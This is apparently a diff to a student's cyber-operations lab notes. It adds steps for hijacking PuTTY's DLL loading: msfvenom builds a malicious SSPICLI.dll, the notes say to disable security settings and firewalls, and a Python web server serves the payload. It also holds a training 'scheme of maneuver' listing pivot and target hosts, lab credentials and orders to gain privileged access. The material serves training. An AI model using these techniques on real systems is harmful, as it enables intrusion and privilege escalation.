@@ -458,6 +458,26 @@ back on windows run program
 on lin-ops run ./winbuff.py
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+@lin-ops:~$ ssh -MS /tmp/jump jump -O forward -D9050 -L <open port>:<target IP>:<target port>
+@lin-ops:~$ xfreerdp /v:127.0.0.1:<port forward> /u:<username> /p:<password> +clipboard /dynamic-resolution
+Open Putty.exe
+Open Procmon
+	Filter on 
+		Process Name contains putty.exe
+		Path 		 contains .dll
+		Result		 is 	  NAME NOT FOUND
+in Powershell
+	(get-process | where-object -property processname -like "putty*").kill
+turn off security settings and firewalls
+@lin-ops:~$ msfvenom -p windows/exec CMD='cmd.exe /C "whoami > C:\Windows\Tasks\whoami.txt"' -f dll > SSPICLI.dll
+@lin-ops:~$ python3 -m http.server <the IP i will use>
+URL linops ip:port used
+download created .dll
+find our file and run again
+file should be created with our output
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 lpid - is a table in the column
 permissions - is the column
 sqlinjection - is the schema
@@ -1068,8 +1088,30 @@ Question 18:
 Question 19:
 	
 
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+Scheme of Maneuver:
+>Jump Box
+->Pivot: 192.168.28.105
+-->T1: 192.168.28.5Target Section:
 
+Pivot
+Hostname: ftp.site.donovia
+IP: 192.168.28.105
+OS: Ubuntu 18.04
+Creds: comrade :: StudentReconPassword
+Last Known SSH Port: 2222
+Malware: none
+Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.
 
+T1
+Hostname: donovian-windows-private
+IP: 192.168.28.5
+OS: Windows ver: Unknown
+Creds: comrade :: StudentPrivPassword
+Last Known Ports: 3389
+PSP: unknown
+Malware: unknown
+Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.
 
 
 
